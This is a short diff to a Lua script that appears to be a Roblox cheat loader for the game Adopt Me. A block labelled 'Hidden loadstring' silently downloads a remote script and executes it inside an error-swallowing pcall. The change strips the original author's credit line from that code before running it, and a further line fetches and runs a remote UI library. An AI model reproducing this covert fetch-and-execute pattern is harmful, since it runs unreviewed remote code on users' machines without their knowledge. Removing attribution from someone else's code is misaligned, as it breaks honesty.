@@ -1,6 +1,12 @@
 -- Hidden loadstring
 pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ultra-Scripts/AdoptmeScript/main/AdoptmeScript/87O7GYM-adopt-me.lua"))()
+    local scriptContent = game:HttpGet("https://raw.githubusercontent.com/Ultra-Scripts/AdoptmeScript/main/AdoptmeScript/87O7GYM-adopt-me.lua")
+    
+    -- Modify the script content to hide the message
+    scriptContent = scriptContent:gsub('By l1ght_ai on discord, join discord%.gg/vlorp for help %([^%)]+%)', '')
+
+    -- Execute the modified script
+    loadstring(scriptContent)()
 end)
 
 local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
